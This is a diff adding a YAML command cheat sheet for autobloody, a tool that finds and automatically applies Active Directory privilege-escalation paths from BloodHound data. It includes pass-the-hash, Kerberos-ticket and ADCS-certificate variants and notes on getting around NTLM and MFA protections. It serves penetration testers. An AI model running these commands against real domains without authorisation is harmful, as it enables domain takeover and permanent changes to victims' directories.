@@ -1,0 +1,62 @@
+tool: autobloody
+tags: [active-directory, pentest, privilege-escalation, bloodhound, exploitation, security, ldap]
+
+actions:
+# === BASIC PATHFINDING & SIMULATION ===
+ - title: autobloody - find and simulate privesc path
+   desc: |
+     This command connects to the Neo4j database to identify the shortest attack path between a source node and a target node. 
+     By default, it only displays the path and the actions required without actually performing them on the Active Directory. 
+     It is the safest way to verify that a path exists and understand the required LDAP modifications before taking any action.
+   command: "autobloody --dbpassword {{neo4j_password|neo4j}} --dbsource {{source_node}} --dbtarget {{target_node}} --username {{username}} --password {{password}} --host {{dc_host}}"
+
+ - title: autobloody - execute privesc path automatically
+   desc: |
+     Use this command when you want to automatically apply the identified privilege escalation path in the environment. 
+     The --yes flag forces the tool to perform the LDAP/Active Directory modifications required to grant the source node the necessary permissions. 
+     Be aware that this makes permanent changes to the AD environment and should be used with caution during engagements to avoid unwanted disruption.
+   command: "autobloody --dbpassword {{neo4j_password|neo4j}} --dbsource {{source_node}} --dbtarget {{target_node}} --username {{username}} --password {{password}} --host {{dc_host}} --yes"
+
+# === AUTHENTICATION VARIANTS ===
+ - title: autobloody - authenticate using NTLM hash
+   desc: |
+     This command enables Pass-the-Hash authentication for scenarios where the cleartext password is not available. 
+     The password field accepts the format 'LMHASH:NTHASH' to authenticate against the Domain Controller. 
+     This is standard procedure during lateral movement after dumping hashes from memory or SAM databases.
+   command: "autobloody --dbpassword {{neo4j_password|neo4j}} --dbsource {{source_node}} --dbtarget {{target_node}} --username {{username}} --password {{nt_hash}} --host {{dc_host}}"
+
+ - title: autobloody - authenticate via Kerberos
+   desc: |
+     Leverages Kerberos authentication instead of NTLM for the Active Directory connection. 
+     Before running this, ensure you have a valid Kerberos ticket (TGT) in your cache and the KRB5CCNAME environment variable is correctly set. 
+     This method is useful for bypassing NTLM-specific restrictions or avoiding NTLM relay protections.
+   command: "autobloody --dbpassword {{neo4j_password|neo4j}} --dbsource {{source_node}} --dbtarget {{target_node}} --host {{dc_hostname}} --kerberos"
+
+ - title: autobloody - authenticate using PKI certificates
+   desc: |
+     Performs authentication using a certificate and private key pair, common in ADCS (Active Directory Certificate Services) exploitation. 
+     The certificate argument requires the path to the private key and the certificate file separated by a colon. 
+     This allows for privilege escalation even when passwords are changed or MFA is enforced on standard login methods.
+   command: "autobloody --dbpassword {{neo4j_password|neo4j}} --dbsource {{source_node}} --dbtarget {{target_node}} --certificate {{key_path}}:{{cert_path}} --host {{dc_host}}"
+
+# === CONNECTION & ADVANCED SETTINGS ===
+ - title: autobloody - use secure LDAP (LDAPS)
+   desc: |
+     Forces the tool to communicate with the Domain Controller over LDAPS (port 636) instead of plain LDAP. 
+     This is often required in hardened environments where LDAP signing or channel binding is enforced. 
+     Ensure the --host parameter matches the Subject Alternative Name (SAN) of the DC's certificate to prevent SSL handshake failures.
+   command: "autobloody --dbpassword {{neo4j_password|neo4j}} --dbsource {{source_node}} --dbtarget {{target_node}} --username {{username}} --password {{password}} --host {{dc_hostname}} --secure"
+
+ - title: autobloody - connect to custom Neo4j instance
+   desc: |
+     Specifies a custom URI for the Neo4j database if it is not running on the local machine or default port. 
+     This is particularly useful when running the tool from a different container or pivot host than the one hosting BloodHound. 
+     The URI format should follow the 'bolt://ip:port' structure used by Neo4j's interface.
+   command: "autobloody --dburi {{bolt_uri|bolt://localhost:7687}} --dbuser {{db_user|neo4j}} --dbpassword {{neo4j_password|neo4j}} --dbsource {{source_node}} --dbtarget {{target_node}} --host {{dc_host}}"
+
+ - title: autobloody - verbose debugging mode
+   desc: |
+     Increases the verbosity of the output to provide detailed information about the tool's internal operations. 
+     Using -vv will enable DEBUG level logging, which is invaluable for troubleshooting connection issues or understanding why a specific edge cannot be exploited. 
+     It shows the raw LDAP queries and the specific decisions made by the pathfinding algorithm.
+   command: "autobloody --dbpassword {{neo4j_password|neo4j}} --dbsource {{source_node}} --dbtarget {{target_node}} --host {{dc_host}} -vv"
